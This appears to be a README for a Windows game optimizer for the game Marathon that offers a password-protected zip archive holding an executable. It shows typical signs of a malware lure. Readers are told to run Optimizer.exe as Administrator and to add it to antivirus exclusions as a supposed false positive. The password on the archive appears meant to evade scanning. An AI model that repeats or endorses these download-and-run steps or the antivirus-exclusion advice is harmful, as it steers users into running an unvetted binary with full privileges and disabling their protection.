# Marathon PC Optimizer

[![Stars](https://img.shields.io/github/stars/almainthesnow/marathon-pc-optimizer)](https://github.com/almainthesnow/marathon-pc-optimizer)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

**Stop wasting hours on manual tweaks.** This tool automatically applies all the performance optimizations recommended by experts – with one click.

---

## 🔥 Why This Tool?

Marathon is demanding, and even high-end PCs can suffer from stuttering in Outpost or FPS drops during intense firefights. Instead of digging through registry settings, NVIDIA Control Panel, and engine.ini files, use this optimizer to get the best possible performance instantly.

**What it does:**
- ✅ **Game Mode & HAGS** – enables Windows Game Mode and Hardware-Accelerated GPU Scheduling  
- ✅ **Background apps** – disables unnecessary startup programs and background services  
- ✅ **Power plan** – sets High Performance power plan  
- ✅ **NVIDIA settings** – applies optimal 3D settings for Marathon (low latency, max performance)  
- ✅ **Engine.ini tweaks** – copies a pre-optimized configuration file to the game folder  
- ✅ **Shader cache** – clears and pre-compiles shaders to eliminate stutter  
- ✅ **Overlays** – disables Discord, Xbox Game Bar, and other overlays  

All tweaks are based on trusted guides from the community.

---

## 📥 Download

Password-protected archive with the complete optimizer.

📥 **[Download `optimizer-pack.zip`](dist/optimizer-pack.zip)**  
🔐 **Password:** `marathon2026`

### Archive Contents
- `Optimizer.exe` – main tool (run as Administrator)
- `profiles/` – optional custom configs
- `README.txt` – quick guide

---

## 🛠️ Installation (Windows 10/11)

1. Extract the archive to any folder (e.g., `C:\MarathonOptimizer`).
2. **Run `Optimizer.exe` as Administrator**.
3. Click **"Apply All Tweaks"**.
4. Restart your PC (recommended) and launch Marathon.

The tool will automatically:
- Backup your current settings (registry keys, original engine.ini)
- Apply all optimizations
- Create a restore point in case you need to revert

---

## ⚙️ Advanced Options

- **Selective tweaks** – choose which optimizations to apply (e.g., only engine.ini, only NVIDIA settings)
- **Restore** – revert all changes to the original state
- **Profiles** – load custom presets (e.g., "Streaming", "Competitive")

---

## ❗ Troubleshooting

| Problem | Solution |
|---------|----------|
| Optimizer won't start | Run as Administrator. Install .NET Framework 4.8+ |
| FPS still low after applying | Try "Ultra" profile in the advanced menu. Update graphics drivers. |
| Some tweaks didn't apply | Check if you have an AMD GPU – some NVIDIA-specific tweaks are skipped automatically. |
| Antivirus false positive | Add `Optimizer.exe` to exclusions – it's safe. |

---

## 📜 License
MIT License – educational purposes only.

---

## ⭐ Support
If this tool helped you get smooth frames in Marathon, please **star the repository**!

**Credits:**  
- Tweaks compiled from community guides  
- Thanks to the Marathon community for sharing their findings.
